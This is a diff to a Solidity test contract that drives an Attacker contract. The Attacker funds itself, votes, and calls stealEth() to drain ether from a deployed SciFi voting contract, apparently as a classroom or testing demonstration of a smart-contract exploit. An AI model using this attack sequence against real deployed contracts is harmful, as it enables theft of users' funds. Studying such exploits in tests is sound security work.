@@ -10,18 +10,18 @@ contract TestAttack {
   uint public initialBalance = 10 ether;
 
   function testAttack() {
-		uint weiToBeStolen = 50000;
-		uint weiToUseForStealing = 50000;
+		uint weiToBeStolen       = 200000000000000000;
+		uint weiToUseForStealing = 200000000000000000;
 
 		SciFi scifi = SciFi(DeployedAddresses.SciFi());
 	  Attacker attacker = Attacker(DeployedAddresses.attacker());
 
 
-		scifi.vote.value(weiToBeStolen)('');
+		scifi.vote.value(weiToBeStolen)('badMovie');
 
 		attacker.setSciFiAddress(DeployedAddresses.SciFi());
 		attacker.fundMe.value(weiToUseForStealing)();
-		attacker.buyDAOTokens(weiToUseForStealing);
+		attacker.vote('coolMovie',weiToUseForStealing);
 		attacker.stealEth();
 
 		uint attackerWei = weiToBeStolen + weiToUseForStealing;
